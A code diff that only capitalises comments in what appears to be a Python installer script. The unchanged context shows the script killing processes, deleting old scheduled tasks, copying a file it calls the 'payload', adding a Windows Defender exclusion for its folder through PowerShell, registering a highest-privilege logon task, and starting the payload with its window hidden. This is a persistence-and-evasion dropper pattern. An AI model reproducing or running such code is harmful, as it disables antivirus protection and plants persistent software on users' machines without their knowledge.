@@ -152,7 +152,7 @@ try:
 except Exception as e:
     log(f"Parent terminate note: {e}")
 
-# if an existing scheduled task points elsewhere, stop/delete it, keep it if no already pointing to the payload
+# If an existing scheduled task points elsewhere, stop/delete it, keep it if not already pointing to the payload
 same_task_target = False
 try:
     ps_cmd = (
@@ -180,7 +180,7 @@ if not same_task_target:
     except Exception as e:
         log(f"schtasks pre-clean error: {e}")
 
-# kill any running instances of the TARGET payload by basename
+# Kill any running instances of the TARGET payload by basename
 try:
     for pr in psutil.process_iter(['pid','name','exe']):
         try:
@@ -196,7 +196,7 @@ try:
 except Exception as e:
     log(f"Bulk kill error: {e}")
 
-# delete old file
+# Delete old file
 if os.path.exists(final_path):
     ok = False
     for i in range(7):
@@ -211,7 +211,7 @@ if os.path.exists(final_path):
         log("Fatal: could not delete old exe")
         sys.exit(1)
 
-# copy payload
+# Copy payload
 try:
     if not os.path.exists(install_dir):
         os.makedirs(install_dir, exist_ok=True)
@@ -226,7 +226,7 @@ except Exception as e:
     log(f"Copy error: {e}")
     sys.exit(1)
 
-# defender exclusion (non-fatal)
+# Defender exclusion (non-fatal)
 try:
     folder = os.path.dirname(final_path)
     subprocess.run(f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""', shell=True, check=True)
@@ -234,7 +234,7 @@ try:
 except Exception as e:
     log(f"Defender exclusion error: {e}")
 
-# scheduled task if not exists
+# Scheduled task if not exists
 if not same_task_target:
     try:
         schtasks_cmd = f'schtasks /create /tn "{task_name}" /tr "{final_path}" /sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
@@ -253,7 +253,7 @@ if not same_task_target:
 else:
     log("Skipped task re-creation (already points to this exe)")
 
-# start payload
+# Start payload
 try:
     si = subprocess.STARTUPINFO()
     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
